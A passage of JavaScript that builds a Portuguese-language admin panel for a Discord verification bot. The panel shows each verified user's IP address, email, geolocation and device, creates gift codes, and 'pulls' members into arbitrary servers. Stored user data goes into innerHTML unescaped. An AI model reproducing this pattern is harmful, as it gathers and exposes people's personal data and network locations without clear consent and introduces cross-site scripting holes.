    h += 'async function api(url,options){options=options||{};var opts={method:options.method||"GET",headers:{"Content-Type":"application/json","x-painel-token":TOKEN,"x-csrf-token":CSRF}};if(options.body)opts.body=options.body;var resp=await fetch(url,opts);if(resp.status===401){fazerLogout();throw new Error("Sessão expirada");}return resp;}';

    h += 'function toast(msg,tipo){tipo=tipo||"sucesso";var el=document.getElementById("toast");el.textContent=msg;el.className="toast ativo "+tipo;setTimeout(function(){el.className="toast "+tipo;},3000);}';

    h += 'function formatarData(iso){if(!iso)return "-";return new Date(iso).toLocaleString("pt-BR");}';

    h += 'async function fazerLogin(){var usuario=document.getElementById("loginUsuario").value.trim();var senha=document.getElementById("loginSenha").value;var erro=document.getElementById("loginErro");erro.textContent="";if(!usuario||!senha){erro.textContent="Preencha tudo.";return;}try{var resp=await fetch("/api/painel/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({usuario:usuario,senha:senha})});var data=await resp.json();if(!resp.ok){erro.textContent=data.error||"Erro";return;}TOKEN=data.token;CSRF=data.csrf;localStorage.setItem("painel_token",TOKEN);localStorage.setItem("painel_csrf",CSRF);abrirApp();}catch(err){erro.textContent="Erro de conexão.";}}';

    h += 'async function fazerLogout(){try{await api("/api/painel/logout",{method:"POST"});}catch(e){}localStorage.removeItem("painel_token");localStorage.removeItem("painel_csrf");TOKEN=null;CSRF=null;location.reload();}';

    h += 'function abrirApp(){document.getElementById("loginContainer").style.display="none";document.getElementById("app").classList.add("ativo");carregarStats();}';

    h += 'function mostrarPagina(pagina){document.querySelectorAll(".pagina").forEach(function(p){p.classList.remove("ativo");});document.querySelectorAll(".nav-item").forEach(function(n){n.classList.remove("ativo");});document.getElementById("pagina-"+pagina).classList.add("ativo");document.querySelector("[data-pagina=\\""+pagina+"\\"]").classList.add("ativo");var titulos={dashboard:"Dashboard",verificados:"Verificados",buscar:"Buscar","criar-gift":"Criar Gift","deletar-gift":"Deletar Gift",puxar:"Puxar",servidores:"Servidores",logs:"Logs",bot:"Bot",config:"Config"};document.getElementById("tituloPagina").textContent=titulos[pagina]||"";if(pagina==="verificados")carregarVerificados();if(pagina==="deletar-gift")carregarGifts();if(pagina==="servidores")carregarServidores();if(pagina==="logs")carregarLogs();if(pagina==="config")carregarConfig();if(pagina==="criar-gift")carregarUsuariosSelect();if(pagina==="bot")carregarBotInfo();if(pagina==="buscar"){document.getElementById("resultadoBuscar").innerHTML="";document.getElementById("buscarId").value="";}document.getElementById("sidebar").classList.remove("aberto");}';

    h += 'function toggleSidebar(){document.getElementById("sidebar").classList.toggle("aberto");}';

    h += 'async function carregarStats(){try{var resp=await api("/api/painel/stats");var data=await resp.json();document.getElementById("cardsStats").innerHTML="<div class=\\"card\\"><div class=\\"card-label\\">Verificados</div><div class=\\"card-value primary\\">"+data.total+"</div></div>"+"<div class=\\"card\\"><div class=\\"card-label\\">Gifts Ativos</div><div class=\\"card-value success\\">"+data.giftsAtivos+"</div></div>"+"<div class=\\"card\\"><div class=\\"card-label\\">Gifts Usados</div><div class=\\"card-value warning\\">"+data.giftsUsados+"</div></div>"+"<div class=\\"card\\"><div class=\\"card-label\\">Servidores</div><div class=\\"card-value\\">"+data.servidores+"</div></div>";document.getElementById("topCidades").innerHTML=(data.topCidades||[]).map(function(c,i){return "<tr><td>"+(i+1)+"</td><td>"+c.cidade+"</td><td>"+c.count+"</td></tr>";}).join("")||"<tr><td colspan=\\"3\\" style=\\"text-align:center;color:#52525b\\">Sem dados</td></tr>";}catch(err){toast("Erro ao carregar stats","erro");}}';

    h += 'async function carregarVerificados(){try{var resp=await api("/api/painel/users");USUARIOS_CACHE=await resp.json();renderVerificados(USUARIOS_CACHE);}catch(err){toast("Erro ao carregar usuários","erro");}}';

    h += 'function renderVerificados(users){document.getElementById("totalVerificados").textContent=users.length;var tbody=document.getElementById("tabelaVerificados");if(users.length===0){tbody.innerHTML="<tr><td colspan=\\"6\\" style=\\"text-align:center;color:#52525b\\">Nenhum verificado</td></tr>";return;}tbody.innerHTML=users.map(function(u){var avatar=u.avatar?"https://cdn.discordapp.com/avatars/"+u.id+"/"+u.avatar+".png":"https://cdn.discordapp.com/embed/avatars/0.png";return "<tr><td><div class=\\"avatar-cell\\"><img src=\\""+avatar+"\\"><div><div class=\\"nome\\">"+u.username+"</div><div class=\\"id\\">"+u.id+"</div></div></div></td>"+"<td class=\\"ocultar-mobile\\">"+(u.cidade||"-")+", "+(u.estado||"-")+" - "+(u.pais||"-")+"</td>"+"<td class=\\"ocultar-mobile\\">"+(u.email||"-")+"</td>"+"<td class=\\"ocultar-mobile\\">"+(u.ip||"-")+"</td>"+"<td class=\\"ocultar-mobile\\">"+formatarData(u.verifiedAt)+"</td>"+"<td><button class=\\"btn-acao\\" onclick=\\"desverificar(\\""+u.id+"\\")\\">Desverificar</button></td></tr>";}).join("");}';

    h += 'function filtrarVerificados(){var busca=document.getElementById("buscaVerificados").value.toLowerCase();var filtrados=USUARIOS_CACHE.filter(function(u){return u.username.toLowerCase().includes(busca)||u.id.includes(busca);});renderVerificados(filtrados);}';

    h += 'async function desverificar(id){if(!confirm("Desverificar esse usuário?"))return;try{var resp=await api("/api/painel/users/"+id,{method:"DELETE"});if(resp.ok){toast("Desverificado!");carregarVerificados();if(document.getElementById("resultadoBuscar"))document.getElementById("resultadoBuscar").innerHTML="";}else{toast("Erro","erro");}}catch(err){toast("Erro de conexão","erro");}}';

    h += 'async function buscarUsuario(){var id=document.getElementById("buscarId").value.trim();var btn=document.getElementById("btnBuscar");var res=document.getElementById("resultadoBuscar");if(!id){toast("Cole um ID","erro");return;}if(!/^\\d{17,20}$/.test(id)){toast("ID inválido. Use 17-20 dígitos.","erro");return;}btn.disabled=true;btn.textContent="Buscando...";res.innerHTML="<div class=\\"resultado-box\\">Buscando...</div>";try{var resp=await api("/api/painel/buscar/"+id);var data=await resp.json();if(!resp.ok){res.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";}else if(!data.encontrado){res.innerHTML="<div class=\\"resultado-box erro\\"><strong style=\\"color:#f87171;display:block;margin-bottom:8px\\">Usuário não encontrado</strong>Esse ID não está no banco de dados.<br>Ele nunca se verificou ou foi desverificado.</div>";}else{var avatar=data.avatar?"https://cdn.discordapp.com/avatars/"+data.id+"/"+data.avatar+".png":"https://cdn.discordapp.com/embed/avatars/0.png";res.innerHTML="<div class=\\"resultado-box sucesso\\"><div style=\\"display:flex;align-items:center;gap:16px;margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #1d1d20\\"><img src=\\""+avatar+"\\" style=\\"width:56px;height:56px;border-radius:50%;border:1px solid #26262b\\"><div><div style=\\"font-size:17px;font-weight:600;color:#f4f4f5\\">"+data.username+"</div><div style=\\"font-size:12px;color:#52525b;margin-top:4px;font-family:monospace\\">"+data.id+"</div><div style=\\"font-size:12px;color:#4ade80;margin-top:6px\\">Verificado</div></div></div><div style=\\"display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:20px\\"><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px\\">Email</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+(data.email||"-")+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px\\">IP</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+(data.ip||"-")+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px\\">Localização</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+data.cidade+", "+data.estado+" - "+data.pais+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px\\">Dispositivo</div><div style=\\"font-size:12px;color:#e4e4e7;word-break:break-all\\">"+(data.userDevice||"-").substring(0,80)+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px\\">Verificado em</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+formatarData(data.verifiedAt)+"</div></div></div><div style=\\"display:flex;gap:8px;flex-wrap:wrap\\"><button class=\\"btn-primary\\" onclick=\\"copiarId(\\""+data.id+"\\")\\">Copiar ID</button><button class=\\"btn-acao\\" onclick=\\"desverificar(\\""+data.id+"\\")\\">Desverificar</button></div></div>";}}catch(err){res.innerHTML="<div class=\\"resultado-box erro\\">Erro de conexão</div>";}btn.disabled=false;btn.textContent="Buscar";}';

    h += 'function copiarId(id){navigator.clipboard.writeText(id).then(function(){toast("ID copiado!");}).catch(function(){toast("Erro ao copiar","erro");});}';

    h += 'async function carregarUsuariosSelect(){try{var resp=await api("/api/painel/users");var users=await resp.json();document.getElementById("giftUsuarios").innerHTML=users.map(function(u){return "<option value=\\""+u.id+"\\">"+u.username+" ("+u.id+")</option>";}).join("");}catch(err){}}';

    h += 'function toggleSelecionarUsuarios(){var check=document.getElementById("giftSelecionar").checked;document.getElementById("containerUsuarios").style.display=check?"block":"none";}';

    h += 'async function criarGift(){var quantidade=parseInt(document.getElementById("giftQuantidade").value);var tempo=parseInt(document.getElementById("giftTempo").value);var selecionados=Array.from(document.getElementById("giftUsuarios").selectedOptions).map(function(o){return o.value;});var btn=document.getElementById("btnCriarGift");var resultado=document.getElementById("resultadoGift");if(!quantidade||quantidade<1){toast("Quantidade inválida","erro");return;}btn.disabled=true;btn.textContent="Criando...";resultado.innerHTML="";try{var resp=await api("/api/painel/gifts",{method:"POST",body:JSON.stringify({quantidade:quantidade,tempo:tempo,selecionados:selecionados})});var data=await resp.json();if(!resp.ok){resultado.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";btn.disabled=false;btn.textContent="Criar Gift";return;}resultado.innerHTML="<div class=\\"resultado-box sucesso\\"><strong style=\\"color:#4ade80;display:block;margin-bottom:12px\\">Gift criado</strong><div style=\\"margin-bottom:8px\\"><span style=\\"color:#52525b\\">Código:</span> <code style=\\"color:#e4e4e7;font-family:monospace\\">"+data.codigo+"</code></div><div><span style=\\"color:#52525b\\">Link:</span> <a href=\\""+data.link+"\\" target=\\"_blank\\" style=\\"color:#a1a1aa;text-decoration:underline;text-underline-offset:2px;transition:color 0.2s\\" onmouseover=\\"this.style.color='#e4e4e7'\\" onmouseout=\\"this.style.color='#a1a1aa'\\">"+data.link+"</a></div></div>";toast("Gift criado!");btn.disabled=false;btn.textContent="Criar Gift";document.getElementById("giftQuantidade").value="";}catch(err){resultado.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";btn.disabled=false;btn.textContent="Criar Gift";}}';

    h += 'async function carregarGifts(){try{var resp=await api("/api/painel/gifts");GIFTS_CACHE=await resp.json();renderGifts();}catch(err){toast("Erro","erro");}}';

    h += 'function renderGifts(){var tbody=document.getElementById("tabelaGifts");if(GIFTS_CACHE.length===0){tbody.innerHTML="<tr><td colspan=\\"5\\" style=\\"text-align:center;color:#52525b\\">Nenhum gift</td></tr>";return;}tbody.innerHTML=GIFTS_CACHE.map(function(g){var statusBadge="<span class=\\"badge success\\">Ativo</span>";if(g.status==="esgotado")statusBadge="<span class=\\"badge danger\\">Esgotado</span>";else if(g.expiresAt&&Date.now()>g.expiresAt)statusBadge="<span class=\\"badge warning\\">Expirado</span>";return "<tr><td><code style=\\"font-family:monospace;color:#e4e4e7\\">"+g.codigo+"</code></td><td>"+g.quantidade+"</td><td>"+statusBadge+"</td><td>"+(g.expiresAt?formatarData(new Date(g.expiresAt).toISOString()):"Nunca")+"</td><td><button class=\\"btn-acao\\" onclick=\\"deletarGift(\\""+g.codigo+"\\")\\">Deletar</button></td></tr>";}).join("");}';

    h += 'async function deletarGift(codigo){if(!confirm("Deletar "+codigo+"?"))return;try{var resp=await api("/api/painel/gifts/"+codigo,{method:"DELETE"});if(resp.ok){toast("Deletado!");carregarGifts();}}catch(err){toast("Erro","erro");}}';

    h += 'async function puxarMembros(){var guildId=document.getElementById("puxarGuildId").value.trim();var quantidade=parseInt(document.getElementById("puxarQuantidade").value)||0;var btn=document.getElementById("btnPuxar");var resultado=document.getElementById("resultadoPuxar");if(!/^\\d{17,20}$/.test(guildId)){toast("ID inválido","erro");return;}btn.disabled=true;btn.textContent="Puxando...";try{var resp=await api("/api/painel/puxar",{method:"POST",body:JSON.stringify({guildId:guildId,quantidade:quantidade})});var data=await resp.json();if(!resp.ok)resultado.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";else resultado.innerHTML="<div class=\\"resultado-box sucesso\\">"+data.mensagem+"</div>";}catch(err){resultado.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";}btn.disabled=false;btn.textContent="Puxar";}';

    h += 'async function carregarServidores(){try{var resp=await api("/api/painel/servers");var data=await resp.json();var tbody=document.getElementById("tabelaServidores");if(data.length===0){tbody.innerHTML="<tr><td colspan=\\"3\\" style=\\"text-align:center;color:#52525b\\">Nenhum servidor</td></tr>";return;}tbody.innerHTML=data.map(function(s){return "<tr><td><strong style=\\"color:#e4e4e7\\">"+s.nome+"</strong></td><td><code style=\\"font-family:monospace;color:#a1a1aa\\">"+s.id+"</code></td><td class=\\"ocultar-mobile\\">"+s.membros+"</td></tr>";}).join("");}catch(err){toast("Erro","erro");}}';

    h += 'async function carregarLogs(){try{var resp=await api("/api/painel/logs");LOGS_CACHE=await resp.json();renderLogs(LOGS_CACHE);}catch(err){toast("Erro","erro");}}';

    h += 'function renderLogs(logs){var tbody=document.getElementById("tabelaLogs");if(logs.length===0){tbody.innerHTML="<tr><td colspan=\\"4\\" style=\\"text-align:center;color:#52525b\\">Nenhum log</td></tr>";return;}var cores={entrou:"success",saiu:"warning",ban:"danger",kick:"danger",mute:"warning",unmute:"success",verificacao:"success",gift:"warning"};tbody.innerHTML=logs.slice(0,100).map(function(l){return "<tr><td>"+formatarData(l.data)+"</td><td><span class=\\"badge "+(cores[l.tipo]||"")+"\\">"+l.tipo+"</span></td><td>"+(l.usuario||"-")+"</td><td class=\\"ocultar-mobile\\">"+(l.detalhes||"-")+"</td></tr>";}).join("");}';

    h += 'function filtrarLogs(){var filtro=document.getElementById("filtroLogs").value;if(filtro==="todos")return renderLogs(LOGS_CACHE);renderLogs(LOGS_CACHE.filter(function(l){return l.tipo===filtro;}));}';

    h += 'async function carregarBotInfo(){try{var resp=await api("/api/painel/bot/info");var data=await resp.json();document.getElementById("botUsername").placeholder=data.username;document.getElementById("botStatusTexto").placeholder=data.activity||"Ex: Minecraft";}catch(err){}}';

    h += 'async function salvarUsername(){var nome=document.getElementById("botUsername").value.trim();var btn=document.getElementById("btnUsername");var res=document.getElementById("resultadoUsername");if(!nome){toast("Informe um nome","erro");return;}btn.disabled=true;btn.textContent="Salvando...";try{var resp=await api("/api/painel/bot/username",{method:"POST",body:JSON.stringify({username:nome})});var data=await resp.json();if(!resp.ok)res.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";else{res.innerHTML="<div class=\\"resultado-box sucesso\\">"+data.mensagem+"</div>";toast("Nome alterado!");}}catch(err){res.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";}btn.disabled=false;btn.textContent="Salvar Nome";}';

    h += 'async function salvarAvatar(){var url=document.getElementById("botAvatar").value.trim();var btn=document.getElementById("btnAvatar");var res=document.getElementById("resultadoAvatar");if(!url){toast("Informe uma URL","erro");return;}btn.disabled=true;btn.textContent="Salvando...";try{var resp=await api("/api/painel/bot/avatar",{method:"POST",body:JSON.stringify({url:url})});var data=await resp.json();if(!resp.ok)res.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";else{res.innerHTML="<div class=\\"resultado-box sucesso\\">"+data.mensagem+"</div>";toast("Avatar alterado!");}}catch(err){res.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";}btn.disabled=false;btn.textContent="Salvar Avatar";}';

    h += 'async function salvarStatus(){var tipo=document.getElementById("botStatusTipo").value;var texto=document.getElementById("botStatusTexto").value.trim();var status=document.getElementById("botStatusOnline").value;var btn=document.getElementById("btnStatus");var res=document.getElementById("resultadoStatus");btn.disabled=true;btn.textContent="Salvando...";try{var resp=await api("/api/painel/bot/status",{method:"POST",body:JSON.stringify({tipo:tipo,texto:texto,status:status})});var data=await resp.json();if(!resp.ok)res.innerHTML="<div class=\\"resultado-box erro\\">"+(data.error||"Erro")+"</div>";else{res.innerHTML="<div class=\\"resultado-box sucesso\\">"+data.mensagem+"</div>";toast("Status atualizado!");}}catch(err){res.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";}btn.disabled=false;btn.textContent="Salvar Status";}';

    h += 'async function carregarConfig(){try{var resp=await api("/api/painel/config");var data=await resp.json();document.getElementById("cfgLogChannel").value=data.logChannelId||"";document.getElementById("cfgGiftLogChannel").value=data.giftLogChannelId||"";document.getElementById("cfgRoleId").value=data.roleId||"";}catch(err){}}';

    h += 'async function salvarConfig(){var logChannelId=document.getElementById("cfgLogChannel").value.trim();var giftLogChannelId=document.getElementById("cfgGiftLogChannel").value.trim();var roleId=document.getElementById("cfgRoleId").value.trim();var btn=document.getElementById("btnSalvarConfig");btn.disabled=true;btn.textContent="Salvando...";try{var resp=await api("/api/painel/config",{method:"POST",body:JSON.stringify({logChannelId:logChannelId,giftLogChannelId:giftLogChannelId,roleId:roleId})});if(resp.ok)toast("Configurações salvas!");else toast("Erro","erro");}catch(err){toast("Erro","erro");}btn.disabled=false;btn.textContent="Salvar";}';

    h += 'if(TOKEN)abrirApp();';
    h += 'document.getElementById("loginSenha").addEventListener("keypress",function(e){if(e.key==="Enter")fazerLogin();});';
    h += 'document.getElementById("loginUsuario").addEventListener("keypress",function(e){if(e.key==="Enter")fazerLogin();});';
    h += '</script></body></html>';
    return h;
}
